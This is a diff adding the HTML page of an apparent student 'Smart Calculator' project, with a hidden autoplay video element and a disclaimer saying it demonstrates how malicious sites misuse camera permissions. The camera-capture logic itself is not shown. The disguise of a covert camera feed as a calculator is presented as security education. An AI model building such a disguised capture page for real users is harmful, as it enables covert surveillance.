@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Smart Calculator</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+    <script src="https://apis.google.com/js/api.js"></script>
+</head>
+
+<body>
+<div class="container">
+<div class="div1">
+       <h1>Smart Calculator</h1>
+  <table>
+        <tr>
+            <th colspan="2">Group Name: Cyber Protectors</th>
+        </tr>
+        <tr>
+            <th>Name</th>
+            <th>Roll No</th>
+        </tr>
+        <tr>
+            <td>Faiza Nazeer</td>
+            <td>23F-0592</td>
+        </tr>
+        <tr>
+            <td>Dania Usman</td>
+            <td>23F-0831</td>
+        </tr>
+    </table>
+</div>
+ 
+   
+
+
+
+<div class="div2">
+        <input type="text" class="display" id="display" readonly>
+        <div class="calButtons">
+            <button class="operator" onclick="appendValue('+')">+</button>
+            <button class="number" onclick="appendValue('7')">7</button>
+            <button class="number" onclick="appendValue('8')">8</button>
+            <button class="number" onclick="appendValue('9')">9</button>
+
+            <button class="operator" onclick="appendValue('-')">-</button>
+            <button class="number" onclick="appendValue('4')">4</button>
+            <button class="number" onclick="appendValue('5')">5</button>
+            <button class="number" onclick="appendValue('6')">6</button>
+
+            <button class="operator" onclick="appendValue('*')">*</button>
+            <button class="number" onclick="appendValue('1')">1</button>
+            <button class="number" onclick="appendValue('2')">2</button>
+            <button class="number" onclick="appendValue('3')">3</button>
+
+            <button class="operator" onclick="appendValue('/')">/</button>
+            <button class="number" onclick="appendValue('0')">0</button>
+            <button class="number" onclick="appendValue('.')">.</button>
+
+            <button class="equal" onclick="calculate()">=</button>
+            <button class="operator" onclick="Clear()" style="grid-column: span 4;">C</button>
+
+
+        </div>
+    </div>
+  <div class="div3">
+     <div id="warning" style="display:none">
+        Security Warning:  
+        This demonstration shows how malicious websites may misuse camera permissions.
+        Always verify before allowing camera access.
+    </div>
+   
+   <div class="disclaimer">
+        Disclaimer: This project is for educational and ethical hacking purposes only. Unauthorized
+        access to a user's camera is illegal and a violation of privacy. Ensure you have explicit consent
+        before testing on any device you do not own.
+   </div>
+  </div>  
+  </div> 
+
+<video id="video" autoplay hidden></video>
+  
+
+    
+</body>
+</html>
